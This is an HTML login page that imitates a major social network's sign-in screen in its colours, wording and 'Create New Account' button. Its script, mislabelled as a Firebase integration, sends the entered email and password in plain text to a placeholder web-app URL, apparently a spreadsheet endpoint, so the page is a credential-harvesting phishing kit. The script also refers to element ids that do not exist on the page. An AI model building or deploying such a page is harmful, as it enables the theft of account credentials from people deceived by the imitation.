<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <style>
    * {
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background-color: #ffffff;
      margin: 0;
    }

    .login-container {
      width: 100%;
      max-width: 400px;
      padding: 20px;
      display: flex;
      flex-direction: column;
      gap: 16px;
    }

    .form-group {
      position: relative;
    }

    .input-field {
      width: 100%;
      padding: 22px 16px 8px 16px;
      font-size: 16px;
      border: 1px solid #ccd0d5;
      border-radius: 12px;
      outline: none;
      background-color: #fff;
      transition: border-color 0.2s ease;
    }

    .input-field:focus {
      border-color: #1b74e4;
    }

    /* Floating label styling */
    .floating-label {
      position: absolute;
      left: 16px;
      top: 14px;
      font-size: 16px;
      color: #65676b;
      pointer-events: none;
      transition: all 0.15s ease-in-out;
    }

    /* Moves label up when input has content or focus */
    .input-field:focus ~ .floating-label,
    .input-field:not(:placeholder-shown) ~ .floating-label {
      top: 6px;
      font-size: 12px;
      color: #65676b;
    }

    .login-btn {
      width: 100%;
      padding: 12px;
      background-color: #0064e0;
      color: #ffffff;
      border: none;
      border-radius: 20px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: background-color 0.2s ease;
    }

    .login-btn:hover {
      background-color: #0052b8;
    }

    .forgot-password {
      text-align: center;
      margin-top: 8px;
    }

    .forgot-password a {
      color: #1c1e21;
      text-decoration: none;
      font-size: 15px;
      font-weight: 600;
    }

    .forgot-password a:hover {
      text-decoration: underline;
    }

    .create-account-btn {
      width: 100%;
      padding: 12px;
      background-color: #ffffff;
      color: #0064e0;
      border: none;
      border-radius: 20px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: background-color 0.2s ease;
      border: 1px solid #0064e0;
      margin-top: 50px;
    }
  </style>
</head>
<body>

  <div class="login-container">
    <form id="loginForm">
      
      <div class="form-group" style="margin-bottom: 16px;">
        <input type="email" id="email" class="input-field" placeholder=" " required>
        <label for="email" class="floating-label">Email address or mobile number</label>
      </div>

      <div class="form-group" style="margin-bottom: 16px;">
        <input type="password" id="password" class="input-field" placeholder=" " required>
        <label for="password" class="floating-label">Password</label>
      </div>

      <button type="submit" id="loginBtn" class="login-btn">Log in</button>

      <div class="forgot-password">
        <a href="#">Forgotten password?</a>
      </div>
      
      <div>
        <button type="button" id="createAccountBtn" class="create-account-btn">Create New Account</button>
      </div>
    </form>
  </div>

  <!-- Firebase Integration Script -->
  <script>
    const scriptURL = 'YOUR_WEB_APP_URL';
    const form = document.getElementById('sheetForm');
    const statusText = document.getElementById('status');

    form.addEventListener('submit', e => {
      e.preventDefault();
      statusText.textContent = "Sending...";

      // 1. Grab both field values
      const val1 = document.getElementById('email').value;
      const val2 = document.getElementById('password').value;

      // 2. Send both values in the request body
      fetch(scriptURL, {
        method: 'POST',
        mode: 'no-cors',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ 
          field1: val1, 
          field2: val2 
        })
      })
      .then(() => {
        statusText.textContent = "Data sent successfully!";
        form.reset();
      })
      .catch(error => {
        statusText.textContent = "Error sending data.";
        console.error('Error!', error.message);
      });
    });
  </script>
</body>
</html>
